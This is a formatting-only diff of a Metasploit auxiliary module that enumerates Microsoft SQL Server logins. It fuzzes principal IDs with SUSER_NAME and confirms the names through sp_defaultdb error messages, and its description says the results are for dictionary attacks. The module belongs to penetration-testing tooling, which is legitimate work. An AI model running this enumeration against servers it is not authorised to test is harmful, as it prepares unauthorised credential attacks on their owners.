@@ -12,20 +12,20 @@ class Metasploit3 < Msf::Auxiliary
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'           => 'Microsoft SQL Server - Enumerate SQL Logins',
-      'Description'    => %q{
-        This module can be used to obtain a list of all logins from a SQL Server with any
-        login. Selecting all of the logins from the master..syslogins table is restricted
-        to sysadmins.  However, logins with the PUBLIC role (everyone) can quickly enumerate
-        all SQL Server logins using the SUSER_SNAME function by fuzzing the principal_id parameter.
-        This is pretty simple, because the principal ids assigned to logins are incremental.  Once
-        logins have been enumerated they can be verified via sp_defaultdb error analysis.
-        This is important, because not all of the principal ids resolve to SQL logins.  Some resolve
-        to roles etc.  Once logins have been enumerated they can be used in dictionary attacks.
+      'Name'        => 'Microsoft SQL Server - Enumerate SQL Logins',
+      'Description' => %q{
+        This module can be used to obtain a list of all logins from a SQL Server with any login.
+        Selecting all of the logins from the master..syslogins table is restricted to sysadmins.
+        However, logins with the PUBLIC role (everyone) can quickly enumerate all SQL Server
+        logins using the SUSER_SNAME function by fuzzing the principal_id parameter. This is
+        pretty simple, because the principal ids assigned to logins are incremental.  Once logins
+        have been enumerated they can be verified via sp_defaultdb error analysis. This is
+        important, because not all of the principal ids resolve to SQL logins.  Some resolve to
+        roles etc. Once logins have been enumerated they can be used in dictionary attacks.
       },
-      'Author'         => [ 'nullbind <scott.sutherland[at]netspi.com>'],
-      'License'        => MSF_LICENSE,
-      'References'     => [[ 'URL','http://msdn.microsoft.com/en-us/library/ms174427.aspx']]
+      'Author'      => ['nullbind <scott.sutherland[at]netspi.com>'],
+      'License'     => MSF_LICENSE,
+      'References'  => [['URL','http://msdn.microsoft.com/en-us/library/ms174427.aspx']]
     ))
 
     register_options(
@@ -113,30 +113,27 @@ class Metasploit3 < Msf::Auxiliary
 
   # Gets trusted databases owned by sysadmins
   def get_sql_logins
-
     # Create array to store the sql logins
     sql_logins = []
 
     # Fuzz the principal_id parameter passed to the SUSER_NAME function
     (1..datastore['FuzzNum']).each do|principal_id|
+      # Setup query
+      sql = "SELECT SUSER_NAME(#{principal_id}) as login"
 
-          # Setup query
-          sql = "SELECT SUSER_NAME(#{principal_id}) as login"
+      # Execute query
+      result = mssql_query(sql)
 
-          # Execute query
-          result = mssql_query(sql)
+      # Parse results
+      parse_results = result[:rows]
+      sql_login = parse_results[0][0]
 
-          # Parse results
-          parse_results = result[:rows]
-          sql_login = parse_results[0][0]
-
-          # Add to sql server login list
-          sql_logins.push(sql_login) unless sql_logins.include?(sql_login)
+      # Add to sql server login list
+      sql_logins.push(sql_login) unless sql_logins.include?(sql_login)
     end
 
     # Return list of logins
     sql_logins
-
   end
 
   # Checks if user has the db_owner role
@@ -147,7 +144,6 @@ class Metasploit3 < Msf::Auxiliary
 
     # Check if the user has the db_owner role is any databases
     sql_logins_list.each do |sql_login|
-
       # Setup query
       sql = "EXEC sp_defaultdb '#{sql_login}', 'NOTAREALDATABASE1234ABCD'"
 
@@ -165,11 +161,11 @@ class Metasploit3 < Msf::Auxiliary
 
       # Check if sid resolved to a sql login
       if result.include? 'alter the login'
-
         # Add sql server login to verified list
         verified_sql_logins.push(sql_login) unless verified_sql_logins.include?(sql_login)
       end
     end
+
     verified_sql_logins
   end
 end
